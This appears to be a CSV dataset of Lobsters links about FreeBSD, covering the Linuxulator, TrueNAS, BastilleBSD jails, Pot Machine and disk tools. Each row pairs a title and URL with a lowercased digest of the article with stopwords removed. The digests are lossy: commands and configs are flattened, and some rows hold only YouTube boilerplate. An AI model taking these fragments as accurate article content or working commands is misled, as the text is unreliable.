136,Lobsters,freebsd,FreeBSD,FreeBSD Linuxulator Explained,https://www.leidinger.net/blog/2010/09/28/the-freebsd-linuxulator-explained-for-users/,freebsd linuxulator explained,native sort elf stuff filedirectory trick port port library elf file o abi invalid error chroot compatlinux,mail explained bit time try make easy text future answer want add part go native sort first bit freebsd native one mean file file elf load elf file look elf file elf file know based upon look action table also thing freebsdtable always big least amdintel also include table able one like one loaded build desired table allow call look inside table mean emulationsimulation going least bit bit translationhousekeeping go call mean lot stuff speed would filedirectory trickswhen detects also trick file also table could play trick look file first look compatlinuxa find look compatlinuxhome want home show compatlinuxhome see allow enter via lost ok remove compatlinuxhome fill want enter via could enter homeyourlogin would first let look compatlinuxhomeyourlogin find look homeyourlogin assume would home implies thing hide still able access make hold file file like etcgroup compatlinux linuxbase port one read file linuxbase port plain file either use exist already tree place want use file etcgroup etcpasswd come mind also mark know kerneltable call script brand made make right thing box linuxbase port done let mean start skype want thing compatlinuxetc first font look user id resolved name work use ldap usergroup id need work shall pop screen want linuxbase port also work linuxbase port depends upon yet choice linuxbase port go install port let install linuxbase port release may default linuxbase port note tell install recent linuxbase port default risk may may work depends upon use depend upon work two revert back update recent one could case even recent need library elf file o abi invalid error explained fact filedirectory trick library need library compatlinuxetcldsoconf searched let u assume compatlinuxetcldsoconf search b c mean first get request open alibxyz first try compatlinuxalibxyz exist try alibxyz fails try next look compatlinuxblibxyz exist blibxyznow assume libxyz compatlinuxc library b library mean first find library blibxyz need library depends upon syscall table eg libc bail see lin required type elf search library name least case last time checked order may smarter see error line error elf file o abi invalid mean able find library got library instead go install library make sure find instead library run compatlinuxsbinldconfig compatlinux make change hand instead using port else change may account chroot compatlinuxthe linuxbase port designed nice installandstart full compatlinux chroot compatlinux cause want want chroot machine install linuxdist port linuxdist port installed linuxbase port need redocopy change want
137,Lobsters,freebsd,FreeBSD,Ubiquiti UniFi Controller Installation on FreeBSD,https://youtube.com/watch?v=NsIdeqsx4zs,ubiquiti unifi controller installation freebsd,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ubiquiti unifi controller installation freebsd portspackages youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ubiquiti unifi controller installation freebsd portspackages youtube
138,Lobsters,freebsd,FreeBSD,Fighting Coronavirus with FreeBSD (Folding@Home),https://www.leidinger.net/blog/2020/03/19/fighting-the-coronavirus-with-freebsd-foldinghome/,fighting coronavirus freebsd folding home,fusion unsplash rpm folding home client enable config folding home site,march port text show folding home fusion unsplashhere quick howto want based resource help made port know yet get time make one want make port go ahead wait meupdate made port rpm folding home client enable moduls linuxbase first part enough make sure linprocfslinsysfs procsys cd compatlinuxtar xf pathtofahclient rpmadd user give real home make sure compatlinuxdev mount devfs theremkdir compatlinuxetcfahclientcp compatlinuxusrsharedocfahclientsampleconfigxml compatlinuxetcfahclientconfigxmlchown r fahclient compatlinuxetcfahclientedit compatlinuxfahclientconfigxml user team team passkey want client need part client stop home user noexec eg zfs datasets execoff make sure home user exec enabledcd fahclient try write work start start usrsbindaemon compatlinuxusrbinfahclient compatlinuxetcfahclientconfigxml runas fahclient pidfilevarrunfahclientpid devnull default pick task option eg much resource used please refer folding home site also aware big rise resource folding home pool work unit may time time adding work unit
139,Lobsters,freebsd,FreeBSD,FreeBSD Foundation Calls All students for Google Summer of Code 2020 Applications,https://summerofcode.withgoogle.com/organizations/5674592867188736/,freebsd foundation call student google summer code application,,
140,Lobsters,freebsd,FreeBSD,FreeBSD to Sponsor Work for 802.11ac Support,https://www.phoronix.com/scan.php?page=news_item&px=802.11ac-FreeBSD-Sponsor,freebsd sponsor work support,ramping freebsd hardware support freebsd foundation buying laptop developer freebsdorg wiki page,window linux seen good wifi support day focused wifi latest wireless chipsets freebsd still tackling freebsd foundation prepared soon begin sponsoring development work ironing support intel one major hardware vendor ramping freebsd hardware support freebsd foundation buying laptop developer order bolster freebsd support modern laptop even effort like freebsd installation server support lagging behind freebsdorg wiki page outline many item still left accomplished supporting wireless standard within freebsd lot work left year overdue good news freebsd foundation announced sponsoring work soon hopefully allow ironed soon bsd begin thinking current wifi standard new adapter coming market
141,Lobsters,freebsd,FreeBSD,MySQL 5.6 Now Successfully Builds with LibreSSL on FreeBSD,https://svnweb.freebsd.org/ports?view=revision&revision=528272,mysql successfully build libressl freebsd,,log message fix problem mysql build libressl error use undeclared identifier warning implicit declaration function sslctxsetciphersuites invalid wimplicitfunctiondeclaration sslctxsetciphersuites sslfd sslcontext special thanks help fluffy pr mfh sponsored netzkommune gmbh
142,Lobsters,freebsd,FreeBSD,Set Up Windows SMB Shares on FreeNAS,https://www.ixsystems.com/blog/windows-smb-shares-on-freenas/,set window smb share freenas,set window smb share freenas blog,set window smb share freenas mar blog tutorial going show set smb share freenas machine share data window client freenas us cifs also known smb samba smb share also compatible macos offering great flexibility client operating system get started already pool configured freenas learn configure pool see freenas zfs pool overview tutorial setting freenas user account first go ahead set freenas user account allows securely access share go account user left menu creating new user called homeuser adding new primary group configuring new share use user group sure substitute user group needed setting window smb share go storage pool left hand side open pool option clicking dot right pool add dataset calling windowset setting share type smb click save done next create window share go sharing window share smb click add click folder icon browse path dataset want share windowset give share name let call one windowshare select allow guest access would like guest view file without password note window server system guest access disabled default macos need set connect option guest click save done ask enable service smb protocol editing acls next step need assign user created earlier share smb window open share option clicking dot right edit acl left side leave root wheel original owner dataset give another user ownership permission click add acl item choose user field homeuser user field may copy setting acl item setting right side allow configure dataset access control list according network security need note set share type smb earlier acl option default specific configuration shown refer freenas documentation configuration recommendation acls click save done enabling smb service go service page make sure running enabled next smb ensure smb always running freenas reboots check start automatically additional option configure smb service click edit icon information option found documentation default value work fine accessing smb share window head window machine open file explorer type followed freenas ip address able see share right click shared folder click map network drive check box connect using different credential click finish enter login detail account created beginning homeuser able add delete create file folder thank reading tutorial sure check tutorial video youtube channel
143,Lobsters,freebsd,FreeBSD,FreeBSD Loader and Console Future,https://lists.freebsd.org/pipermail/freebsd-current/2020-March/075404.html,freebsd loader console future,loader console tsoome mecom information freebsdcurrent mailing list,loader console toomas soome tsoome mecom mon mar utc hi busy bit time back poking bit current vidconsole bios system text mode screen managed teken terminal emulator draw vga text buffer comconsole serial port driver shared bios uefi mode efi text mode console device gfx display serial port connected back end device connection done firmware write using uefi simple text output protocol see also conout uefi variable manage screen efi console also default use teken terminal emulator however serial port multiplexed conout terminal emulator draw screen would distort serial console worse least uefi firmware implementation pas esc code via simple text output protocol causing console filled broken csi sequence arm efi console state serial driver provide comconsole serial console available via redirection firmware actually basic comconsole implementation via uefi serial io protocol unfortunately uefi api provide good way identify serial port get array handle serial port sio handle opaque want get would like framebuffer console least efi draw glyph use simple text output protocol console output allow u provide consistent screen output draw image would depend simple text output uefi gfx console already built framebuffer physical system get fb address size attribute passing kernel kernel draw conole simple text output protocol available start kernel get done need console font able output text plan build loader binary limited set ascii box drawing font gained access disk load best matching font current resolution make first problem font file usrsharevtfonts many option usr might would need copy font boot tree use terminus font consistency glyph range various glyph size kernel default built font terminus ability draw glyph build console device list console variable currently done bios version still use console name efi fb console leave efi pure simple text output based console something would need decide draw fb console uefi hard add implementation bios vbe interface sum assumption iswas change name console driver keep expected value people used however quite easy introduce new console type needed need provide serial driver platform provide option switch text gfx mode system bios vga gfx performance may low text mode might preferred screen update implemented via teken callback mechanism also done kernel matter support display image using pnglite therefore png format interpreter need update support feature actually core implementation uefi already polishing still get time actually cheating quite bit done work already porting different terminal emulator hope writeup give light happening area thanks toomas information freebsdcurrent mailing list
144,Lobsters,freebsd,FreeBSD,Introduction to Flua on FreeBSD,https://kevans.dev/flua/,introduction flua freebsd,first lua used currently used module flua style stylelua,freebsd base system includes flua f reebsd lua post kind describe design goal flua use new tool base system first flua lua scripting language use freebsd base system based canonical lua implementation shared freebsd bootloaders used default freebsd later perhaps topic another day driving menu system small enhancement early boot process version notably devoid floating point support supported loader environment flua also includes partiallyimplemented subset module generally available port set module included flua extent actually implemented completely subject change based need base system later used advocate use flua base system component warranty guarantee provided flua may change time request addition flua may considered depending usecase ultimately implementation reflect need base system reasonable us downstream project currently used currently flua used generate various syscallrelated file via toplevel sysent target use replaced shell script featured mix posix shell sed awk task proposal thing written rewritten flua welcome discussion ldconfig one tool proposed rewriting flua goal usable lua script pkg particular could use recently started gaining support sandboxed lua script ldconfig somewhat commonly executed postinstall script module currently following module partially implemented flua module written flua builtin c module compatible module name available port part actually implemented general idea goal nt necessarily need feature say lposix always able point port indicate set port install completely replace flua without losing functionality script target flua way flua nt provide unique functionality obtained port merely provides mean use functionality base system component flua style lua base system actually style guide stylelua one may also reference various example throughout tree standlua lua systoolsmakesyscallslua flua style fairly fluid still somewhat explored
145,Lobsters,freebsd,FreeBSD,GhostBSD 20.02 Overview,https://youtube.com/watch?v=kFG-772WGwg,ghostbsd overview,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ghostbsd overview solid friendly youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature ghostbsd overview solid friendly youtube
146,Lobsters,freebsd,FreeBSD,FreeNAS and TrueNAS are Unifying,https://www.ixsystems.com/blog/freenas-truenas-unification/,freenas truenas unifying,freenas truenas unifying blog freenas truenas truenas gained parity freenas benefit expect two name become one truenas core always open always free na truenas domain truenas enterprise best value enterprise storage truenas preview available march truenas subforum next step blog feature coming truenas core truenas enterprise,freenas truenas unifying mar blog freenas truenas freenas truenas separatebutrelated member open source storage software family since freenas free open source version expert community led pursuit innovation like plugins vms truenas enterprise version organization size need additional uptime performance well enterprisegrade support necessary critical data application beginning ixsystems developed tested documented released separate product even though vast majority code shared deliberate technical decision beginning time became le necessity always done furthermore change going require serious overhaul build package product among thing continued kick road made systematic improvement development qa efficiency past year redundant release process became almost impossible ignore next major efficiency roadblock overcome finally rolled sleeve recent release truenas gained parity freenas feature like vms plugins homogenizing code today announce next phase evolution freenas truenas release coming latter half year bring feature improvement release come also unify product single software image name shift great many benefit user go detail like first reassure plan stop releasing free version close source limit feature want make sure way go benefit union convenience major technical benefit user contributor rapid development unified image accelerate software development release example major release would normally taken month release new efficiency bringing closer six month improved quality reduced development redundancy unified qa increase software quality allows u streamline testing earlier hardware enablement staying insync upstream o version easier allowing earlier access newer hardware driver instance brings improved support amd epyc ryzen platform enhanced numa support efficient cpu core handling simplified documentation unified documentation eliminates redundancy separate user guide deduplication effort unified web content video refer one software family without need duplication flexibility unified image enable simpler transition upgrade edition resource efficiency free developer work new feature related product open zfs planning unified release began year ago included major investment development integration soon released openzfs effort fastforwarding delivery advance like dataset encryption major performance improvement compatibility linux zfs pool overall union provides solid foundation featurerich future expect release freenas truenas share source code built separate image name version release change process moving one unified image two different edition free open source edition never change enterprise edition edition common open source code unified documentation shared product name web interface rest apis relatively unchanged version addition new feature vp engineering kris moore describes change process video blog two name become one year talked longingly unifying image documentation web content due efficiency gain benefit one thing always held u back question name unification software meant two distinct product name longer workable grown attached name community customer perhaps even one hand freenas brand everyone come know love let user know immediately product cost anything use also hint fact open source hand truenas better name enterprise product may remember truenas originally released freenas pro feedback received many company take seriously felt product free name inspire necessary confidence critical infrastructure data hence name truenas born overcome stigma enterprise side business grown reliably since many month analysis weighing pro con spirited debate decided technical benefit efficiency unifying product significant ignore overwhelmingly outweigh attachment name therefore decided merge name share stronger enterprise brand truenas continue give user confidence use product important missioncritical application still paying homage freenas use sharkthemed icon logo also continue emphasize benefit open source submoniker open storage present two different edition truenas core truenas enterprise without license key truenas core provides unrestricted freenas functionality know love source code still open source forever free use truenas enterprise enable extended feature set using license key supported platform move elevates freenas enterprisegrade quality level truenas cement position world open storage o truenas core always open always free na thing changing name freenas take name truenas core freenas truenas core enterprisequality softwaredefined storage used without restriction cost also core fullfledged enterprise edition truenas enterprise provides additional faulttolerance performance support business critical application require core commitment core functionality freenas user love included best free na software core also defines acronym immensely proud freenas community change name change underlying freebsd o freebsdbased license commitment free open source software longtime freenas diehard option use existing freenas name logo banner web interface simply selecting freenas theme dropdown upper righthand action bar choose web visitor eventually forwarded new truenas web page still little away freenasorg domain remain place time use truenas domain provide common source information change community logins newsletter truenas core major advance freenas include support fusion pool mixing ssd hdd vdevs encrypted datasets complete list hundred improvement made beta release announcement truenas enterprise best value enterprise storage truenas customer see smaller name change move version see change new shark fin icon freenas shark icon well known modernized icon represents stealthy mighty storage competitor truenas become new name truenas enterprise inherits enclosure management high availability support truenas benefit truenas enterprise system automatically inherit truenas core feature preinstalled key unlocks enterprise feature truenas preview everyone invited experience early preview truenas nightly image available march anyone spare system test develop would love hear feedback sure check fusion pool dataset encryption let u know think started truenas subforum community forum blog community feedback general always looking opinion idea improve truenas product next step truenas core go alpha beta release state freenas gone change software update process information available process efficient within ixsystems expect deliver user resource today truenas core planned release much shorter development cycle release magnitude thanks change user asked u whether paid option upgrade system running truenas core enterprise change release process make upgrade possible investigating option enable also opportunity develop radical improvement truenas functionality please contact u organization need something yet available always huge thanks go community customer continued support helping u democratize enterprise storage excited work side side next phase freenas truenas journey many great thing come information truenas please check new blog feature coming truenas core truenas enterprise
147,Lobsters,freebsd,FreeBSD,FreeBSD Journal 2020/01-02,https://www.freebsdfoundation.org/past-issues/freebsd-in-research/,freebsd journal,table content click start reading,table content click start reading
148,Lobsters,freebsd,FreeBSD,FreeBSD Find Installed Hard Disk Size Information,https://www.cyberciti.biz/faq/freebsd-hard-disk-information/,freebsd find installed hard disk size information,varrundmesgboot ad ad list detected hard disk cdroms ssds freebsd grep command geom utility geom egrep command grep command atacontrol command older version freebsd warning say hello camcontrol command list physical device list current partition information using geom probe disk source shell script list detect freebsd server disk create shell script execute shell script freebsd print attached disk size lsblk command conclusion man page latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter,find installed hard disk drive name freebsd operating system without rebooting server use equivalent fdisk l linux freebsd list hard disk drive find hard disk size freebsd easiest way find detected hardware information freebsd go varrundmesgboot file file usually snapshot buffer content taken soon file system mounted startup time modified till system rebooted like linux freebsd follows sort physical disk naming convention advertisement ide hard disk name start ad first ide hard disk second hard disk onsatassd ata direct access device driver disk name start ad devada devsdb onscsi hard disk name start da devda ide cdromrwdvd name start acd devacd scsi cdromrwdvd name start cd devcd list detected hard disk cdroms ssds freebsdtype following grep command enter egrep da cd varrundmesgboot egrep ad cd varrundmesgboot sample output dvdrom trying mount root ufs output clear following storage installed freebsd server first hard disk connected ata channel second hard disk connected ata channel dvd romgeom utilitytry show detailed information disk using geom geom disk list geom disk list geom disk list sample output geom name provider name mediasize sectorsize stripesize stripeoffset mode descr sandisk lunid ident rotationrate fwsectors fwheads filter info using egrep commandgrep command geom disk list grep mediasize sample outputsmediasize atacontrol command older version freebsd atacontrol utility control program provides user access control freebsd ata ide sata hard disk subsystemwarning example may crash computer loss data executed improperly please exercise caution using atacontrol command list option list hard disk enter atacontrol list output ata channel master device present slave ataatapi revision ata channel master device present slave device present ata channel master serial ata ii slave device present ata channel master serial ata ii slave device presentsay hello camcontrol commandthe cam subsystem provides uniform modular system implementation driver control various scsi ata device utilize different scsi ata host adapter host adapter driver use camcontrol utility access cam subsystemlist physical devicestype following command camcontrol devlist sample output freebsd device list using camhow list current partition information use following command gpart show sample output gpt biosboot free freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdzfs free gpt free freebsdzfs free gpt biosboot free freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdswap freebsdzfs free gpt free freebsdzfs free gpt free freebsdzfs free using geom probe diskstype following command source run script using sh sh c usrsharebsdconfigdevicesubr fdevicemenu disk run script using sh sh c usrsharebsdconfigdevicesubr fdevicemenu disksample output geom probe installed disk freebsda shell script list detect freebsd server diskscreate shell script named showdisk follows binsh name showdisk author fraubsd usrsharebsdconfigdevicesubr exit id u eq info gpart show n snn disk gpart inquiry identify device msgcanceldone fdevicemenu dialogtitle select disk device hlinearrowstabenter devicetypedisk break device get name disk gpart gpart show disk withcamcontrol inquiry camcontrol inquiry disk identify camcontrol identify disk else info info warning must root use camcontrol n fi inquiry info info camcontrol inquiry disk n snn identify info info camcontrol identify disk n sn fshowmsg info disk gpart inquiry inquiry identify identify done binsh name showdisk author fraubsd usrsharebsdconfigdevicesubr exit id u eq info gpart show n snn disk gpart inquiry identify device msgcanceldone fdevicemenu dialogtitle select disk device hlinearrowstabenter devicetypedisk break device get name disk gpart gpart show disk withcamcontrol inquiry camcontrol inquiry disk identify camcontrol identify disk else info info warning must root use camcontrol n fi inquiry info info camcontrol inquiry disk n snn identify info info camcontrol identify disk n sn fshowmsg info disk gpart inquiry inquiry identify identify donenext execute shell script freebsd chmod x showdisk showdisklist connected ssd hard drive device freebsdfreebsd print attached disk sizerun diskinfo command diskinfo v diskname diskinfo v diskinfo v sample output sectorsize mediasize byte mediasize sector stripesize stripeoffset cylinder according firmware head according firmware sector according firmware hgst disk descr disk ident trimunmap support rotation rate rpm notzoned zone mode disk size another output sandisk ssd installed freebsd server lsblk commandlet u install lsblk command follows sudo pkg install lsblk sample output updating freebsd repository catalogue freebsd repository date repository date following package affected checked new package installed lsblk number package installed kib downloaded proceed action yn fetching kib checking integrity done conflicting installing extracting run follows lsblk get list actual disk sysctl kerndisks find info disk lsblk conclusionyou learned find information installed hard drive disk size freebsd using command line option see camcontrol man page gpart man page tooposted vivek gite author creator nixcraft seasoned sysadmin devops engineer trainer linux operating systemunix shell scripting get latest tutorial sysadmin linuxunix open source topic via rssxml feed weekly email newsletter advertisement
149,Lobsters,freebsd,FreeBSD,Pot Machine Creates Local Vagrant VM with FreeBSD 12 Running on ZFS under LINUX/MACOS,https://github.com/ebarriosjr/potMachine,pot machine creates local vagrant vm freebsd running zfs linuxmacos,description http githubcompizzamigpot macos install virtualbox http install vagrant http compile potmachine binary linux install virtualbox http wwwvirtualboxorgwikilinuxdownloads install vagrant http compile potmachine binary move binary initialize potmachine command option potfile potfile example nginx command available potfile http fileservercomtestrar help bonus mesh command option experimental macos xhyve support macos install xhyve compile potmachine binary,description pot machine creates local vagrant vm running zfs allows developer test local pot http githubcompizzamigpot linux macos implementation try mimic much possible model implemented docker mean potfiles write configuration pot running pot build create freebsd jail based config also possibility create minipot enviroment includes pot nomad consul default program create folder pot contain configuration export made wit pot folder mounted inside vagrant vm vagrant macos install virtualbox http install vagrant http compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine goosdarwin go build pot linux install virtualbox http wwwvirtualboxorgwikilinuxdownloads install vagrant http compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine gooslinux go build pot move binary platform linuxmacos binarie need moved folder inside user path example mv pot usrlocalbinpot initialize potmachine command start vagrant vm running pot without nomad consul traeffic pot machine init virtualbox command option option ip assigns ip potmachine v verbose potfile potfile configuration file si ilar dockerfile file build pot triggered order create pot potfile command pot build need executed also tag build export pot one command example pot build command create pot export zfs dataset compres xz format potexports order push pot dataset need run following command pot push file server requires authentication give pot information running pot login u username passwordstdin fileserverexample information save potconfigjson used every push domain potfile example nginx name tcsnginx copy indexhtml usrlocalwwwnginxdistindexhtml run sed squarterlylatest etcpkgfreebsdconf run pkg install nginx run pkg clean flavour slim cmd nginx command available potfile command description example base freebsd o run inside jail name name pot jail name nginx copy copy local file jail running command run stanza copy indexhtml usrlocalwwwnginxdistindexhtml add downloads remote file pot jail add http fileservercomtestrar arg env variable get added inside creation process pot jail arg varvalue run command executed creation pot jail run pkg install nginx flavour predifined user created script apply pot run done flavour slim expose tell pot port exposed expose memory memory limitation pot jail memory cpu number core assing pot jail cpu env add enviroment variable inside running pot jail env varvalue cmd array command executed pot start cmd nginx g daemon help pot h local command machine creates local enviroment pot jail build build image potfile push push pot image web endpoint login log pot file server remote command usage pot command option command help show help version show pot version config show pot framework configuration lslist list installed pot show show pot information info print minimal information pot top run unix top pot p show running pot init initialize zfs layout deinit deinstall pot system vnetstart start vnet configuration createbase create new base image createfscomp create new f component createprivatebridge create new private bridge create create new pot jail clone clone pot creating new one clonefscomp clone fscomp rename rename pot destroy destroy pot prune destroy running prunable pot copyin copy file directory pot mountin mount directory zfs dataset fscomp pot adddep add dependency setrss set resource constraint getrss get current resource usage setcmd set command start pot setenv set environment variabls inside pot sethosts set etchosts entry inside pot setattr set pot attribute getattr get pot attribute exportports let export tcp port start start jail pot stop stop jail pot term start terminal pot run start open terminal pot snapsnapshot take snapshot pot rollbackrevert restore last snapshot purgesnapshots remove oldall snapshot export export pot file import import pot file url prepare import prepare pot designed jail orchestrator updateconfig update configuration pot bonus mesh want run service mesh local machine use minipot minipot program run nomad consul traeffic pot single vagrant vm give enviroment test develop application local enviroment command option option ip assigns ip potmachine v verbose experimental macos xhyve support macos install xhyve compile potmachine binary git clone http githubcomebarriosjrpotmachinegit cd potmachine goosdarwin go build pot
150,Lobsters,freebsd,FreeBSD,Release of pkg 1.13 for FreeBSD,https://svnweb.freebsd.org/ports?view=revision&revision=525794,release pkg freebsd,,release pkg installing non tracked file owned package pkg save copy file pkgsave fix chickenegg problem meta compressed defining compression format pkg repo create metaconf file uncompressed small enough fallback old metatxz note metatxz still created backward compatibility pkg repo creates meta file version default meaning digeststxz used pkg anyone using version willing upgrade via pkg bootstrap f suppress version checking j specified alphabetically sort package printed output pkg command ease readability pkg lockunlock allows multiple package argument shell script print message along pkgmessages writing pkgmsgfd file descriptor improve error reporting parsing vuxml file lua script ready prime time sanboxed capsicum plateforms support rootdir native documented fix pkg backup pkg give hint running pkg update f case size mismatch script lua shell determine process upgrade installation via variable shell script fully documented keyword file documented pr exprun antoine
151,Lobsters,freebsd,FreeBSD,FreeBSD Finally Removes GCC 4.2.1 from Base System after 13 Years,https://svnweb.freebsd.org/base?view=revision&revision=358454,freebsd finally remove gcc base system year,http http,log message remove gcc build infrastructure described warner email message freebsdarch mailing list reached gcc retirement date time supported architecture either use intree clang rely external toolchain ie contemporary gcc version port gcc released july imported freebsd later year gcc served u well version obsolete used default architecture freebsd support modern c support riscv thanks everyone responsible maintaining updating testing gcc freebsd base system year long thanks fish http pr reviewed brook imp sponsored freebsd foundation differential revision http
152,Lobsters,freebsd,FreeBSD,POWER to the People - Making FreeBSD First Class Citizen on POWER,https://www.freebsdfoundation.org/blog/power-to-the-people-making-freebsd-a-first-class-citizen-on-power/,power people making freebsd first class citizen power,port contributor raptor computing system stable current executable linkable format elf freebsd openness open source firmware stack article explains affordability technical detail challenge llvm workaround http talosanongothpl kde http next share idea invite check way get involved,committer dedication foundation grant raptor computing system support accelerates freebsd power promise open source software freedom another way express freedom choice choice platform deployment model stack configuration etc freebsd foundation dedicated supporting promoting freebsd project community worldwide mean exactly may wonder truth mean many different thing case foundation act expand freedom choice freebsd user power serve varied compute need blog tell story one specific way foundation help member community provide greater hardware choice freebsd user piotr kubaj freebsd port committer based poland whose main field interest improving port architecture paper submitted asia bsdcon piotr explains motivation goal make platform equal term software support includes usual desktopclass software like web browser desktop environment available also includes serverclass software like database piotr began working power system fall contributor submitting hundred patch supporting development effort big impact project like work piotr important part foundation mission said foundation executive director deb goodkin april around time received system foundation piotr developer status elevated committer allowing commit patch piotr work two machine remote server provided raptor computing system local workstation funded freebsd foundation us system work parallel stable current freebsd branch port need direct local access testing stable current run different version executable linkable format elf specification piotr maintains old environment currentlysupported stable branch new current additional patch technical challenge little freebsd two factor particular got piotr excited work openness affordability openness open source firmware stack opposed modern hardware intel amd proprietary article explains article others interesting irony emerges chip maker like intel justify inclusion proprietary firmware security reason system privileged access raise new security concern instance may intel confirmed remote elevation privilege bug management another aspect open firmware relates baseboard management controller bmc stack open bmc particularly important cloudscale deployment least following three reason reproducedebugfixdeployment cycle issue arises cloudscale deployment difficult reproduce issue controlled lab environment make tough find fix problem quickly open bmc stack allows faster debugging security model modern open bmc implementation allow end user leverage security model rather forcing use older model known vulnerability configuration monitoring traditional bmcs require use tooling whereas open bmc inherit host o tooling affordability power version server workstation increasingly affordable entrylevel rack mounted tower configuration available le make exciting time people prefer completely open source solution proprietary one said piotr technical detail challenge linuxtm system already work great server desktop freebsd playing catchup number reason case including ibm historical support linux power freebsd move llvm still recentlysupported power since popular linux distribution littleendian power freebsd still bigendian general lack knowledge among upstream software developer anything linux aixtm run power within freebsd community numerous effort base port improve freebsd powerpc top focus area include llvm kdechromium addition piotr contributor working include justin hibbits jhibbits leandro lupori luporl brendan begren bdragon alfredo dal ava júnior adalava mikael urankar mikael mark linimon linimon llvm since power support llvm freebsd project working switch freebsd port llvm work nearly finished say piotr though still llvmrelated problem tackling example mesa used build present base tried hit clang crash workaround mesa us port anyway use compilation well said piotr change llvm tightly coupled abi llvm requires inconsistent support among freebsd port great progress getting port build compare favorably architecture including contrast completely different abi new compiler new linker mean port build build fine others build build inconsistency port build project decided switch llvm current stable branch left gcc although requires additional maintenance result best experience freebsd user desire fix maintain port abis drove piotr need two power system remote system running freebsd made available pitor free charge raptor computing system run poudriere bulk time result available http talosanongothpl pitor us system fix port environment local system funded freebsd foundation run freebsd current patch used fix port recently main focus llvm still buggy recent llvm improvement piotr starting hit limit old system gcc build turn mean shift focus onto project look forward freebsd modern intree toolchain broad port support kde another problem many kde program well others use qtwebengine basically chromium wrapped thin qt layer display website despite google membership openpower foundation chromium almost power compatibility make thing challenging scarce available compatibility littleendian whereas freebsd power bigendian patch exist support littleendian bigendian piotr successfully compiled webengine currently review http could also first step getting chromium working next switch llvm complete piotr excited tackle following todo list gpu acceleration many desktop port need nice browse website play game watch movie etc without stuttering getting rust nodejs needed build firefox firefox patch committed porting chromium use patch qtwebengine thing pop share idea closing hope deep dive piotr work offer window freebsd foundation support community project part make freebsd exciting technology community fact dynamic play hundred way across number technical domain every day sound like kind community like work invite check way get involved love hear others community similar story tell found blog useful please share http http
153,Lobsters,freebsd,FreeBSD,Full name of root account in BSD,https://www.geeklan.co.uk/?p=2457,full name root account bsd,,
154,Lobsters,freebsd,FreeBSD,Easy and Lightweight Jails with BastilleBSD,https://hackacad.net/freebsd/2020/01/31/easy-freebsd-jail-management-bastille.html,easy lightweight jail bastillebsd,easy lightweight jail bastillebsd hackacad howto create jail bastille tdlr http githubcombastillebsdbastille install bastille bastille active make shure switch latest pkg mirror fun freebsd hackacad,easy lightweight jail bastillebsd hackacad howto create jail bastille tdlr http githubcombastillebsdbastille bastille lightweight jailcontainer management freebsd hardenedbsd install bastille bastille active make shure switch latest pkg mirror change pkg mirror latest vim etcpkgfreebsdconf freebsd url pkghttp pkgfreebsdorg abi latest mirrortype srv signaturetype fingerprint fingerprint usrsharekeyspkg enabled yes enable bastille sysrc bastilleenableyes create virtual network bridge sysrc sysrc service netif cloneup edit etcpfconf add line without extif set blockpolicy return scrub extif fragment reassemble set skip lo table jail persist nat extif jail extif block pas quick modulate state antispoof extif inet pas inet proto tcp port ssh flag ssa keep state add zfs support check zpool zpool list sysrc f usrlocaletcbastillebastilleconf bastillezfsenableyes sysrc f usrlocaletcbastillebastilleconf bastillezfszpoolzroot check zpool list bootstrap create jail bastille bootstrap bastille create testjail bastille start install package login bastille pkg install vimconsole tmux bastille console testjail fun category freebsd hackacad
155,Lobsters,freebsd,FreeBSD,FreeBSD versus Linux Scaling Up to 128 Threads with AMD Ryzen Threadripper 3990X,https://www.phoronix.com/scan.php?page=article&item=3990x-freebsd-bsd,freebsd versus linux scaling thread amd ryzen threadripper,window v linux scaling performance threadripper window performance eight linux distribution phoronix test suite,last week looked window v linux scaling performance threadripper varying corethread count followed looking window performance eight linux distribution usd processor running within thelio major workstation table turned first look processor running bsds freebsd particular article looking freebsd performance seeing performance scale compared ubuntu linux red hat enterprise linux based centos stream first encounter freebsd threadripper thelio major workstation matter experience pleasant issue getting highend desktopworkstation running freebsd working nicely box zen based threadripper network connectivity aspect system issue great see freebsd generally running nicely amd zen system tried far also wanted run dragonflybsd threadripper sadly system failed boot dragonflybsd stable latest daily iso unable boot threadripper though surprising threadripper series processor also run issue dragonflybsd hopefully dragonflybsd get amd support improved nearterm least freebsd running nicely freebsd benchmarked default llvm clang compiler also switching gcc using gnubased toolchain match tested centos ubuntu daily snapshot ubuntu tested linux kernel gcc running rhelbased centos stream also carried linux kernel gcc based toolchain system used throughout testing amd ryzen threadripper stock speed x corsair memory radeon rx xt graphic within gorgeous thelio major chassis via phoronix test suite various linuxbsd multithreaded benchmark carried uefi bios toggling threadripper run core core core core core plus smt default configuration seeing freebsd scaling centos stream ubuntu linux
156,Lobsters,freebsd,FreeBSD,EuroBSDcon 2020 CFP,https://registration.eurobsdcon.org/conferences/2020/program/proposals/new,eurobsdcon cfp,,authorized access page maybe need sign
157,Lobsters,freebsd,FreeBSD,FreeNAS 11.3 Released and Update Overview,https://youtube.com/watch?v=FayzZZpDq4I,freenas released update overview,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas released update overview youtube,press copyright contact u creator advertise developer term privacy policy safety youtube work test new feature freenas released update overview youtube
